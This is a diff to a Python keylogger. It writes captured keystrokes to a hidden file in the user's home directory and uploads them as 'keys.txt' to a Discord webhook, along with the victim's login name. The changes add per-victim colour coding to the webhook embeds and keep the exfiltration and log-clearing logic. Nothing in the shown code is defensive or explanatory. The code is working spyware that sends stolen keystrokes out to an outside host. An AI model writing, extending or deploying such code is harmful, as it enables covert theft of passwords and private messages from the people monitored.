@@ -3,6 +3,7 @@ from pathlib import Path
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import os
+import hashlib
 
 max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
 clear_after_send = True
@@ -14,14 +15,24 @@ def kill_switch():
     if file_path.exists():
         return True
 
+def generate_color(name):
+    hashed_name = hashlib.md5(name.encode('utf-8')).hexdigest()
+    r = int(hashed_name[0:2], 16)
+    g = int(hashed_name[2:4], 16)
+    b = int(hashed_name[4:6], 16)
+    return "{:02X}{:02X}{:02X}".format(r, g, b)
+
 def check_if_should_send(lines):
     print(lines)
     if lines >= max_lines:
-        webhook = DiscordWebhook(url=url, username=str(os.getlogin()))
+        webhook = DiscordWebhook(url=url, username="Keys")
         file_path = Path.home() / "Source/main"
         file_path.parent.mkdir(parents=True, exist_ok=True)
         with file_path.open('r') as file:
             webhook.add_file(file=file.read(), filename="keys.txt")
+        embed = DiscordEmbed(title=f"Logs from {os.getlogin()}", color=generate_color(os.getlogin()))
+        embed.set_timestamp()
+        webhook.add_embed(embed)
         if clear_after_send:
             with file_path.open('w') as file:
                 file.write("")
@@ -187,7 +198,7 @@ if not kill_switch():
                 url = file.readline().replace("\n","")
                 max_lines = int(file.readline())
             webhook = DiscordWebhook(url=url, username="Keys")
-            embed = DiscordEmbed(title=f"Connected to {str(os.getlogin())}")
+            embed = DiscordEmbed(title=f"Connected to {os.getlogin()}", color=generate_color(os.getlogin()))
             webhook.add_embed(embed)
             response = webhook.execute()
 
